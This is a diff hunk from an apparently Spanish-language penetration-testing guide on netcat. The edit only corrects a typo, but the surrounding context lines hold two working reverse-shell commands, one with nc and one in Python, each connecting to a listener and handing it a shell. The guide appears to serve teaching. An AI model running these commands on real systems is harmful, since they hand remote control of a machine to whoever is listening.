@@ -14,7 +14,7 @@ nc <ip-mia> 9999 -e /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.109",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-Utilidad de redpara interactuar con puertos TCP/UDP. Se puede usar para muchas cosas durante una prueba de penetración.
+Utilidad de red para interactuar con puertos TCP/UDP. Se puede usar para muchas cosas durante una prueba de penetración.
 Su uso principal es para conectares a shells.
 Además de eso, se puede usar para conectarse a cualquier puerto de escucha e interactuar con el servicio que se ejecuta en ese puerto. Por ejemplo, enviar todos los datos a un puerto concreto.
 
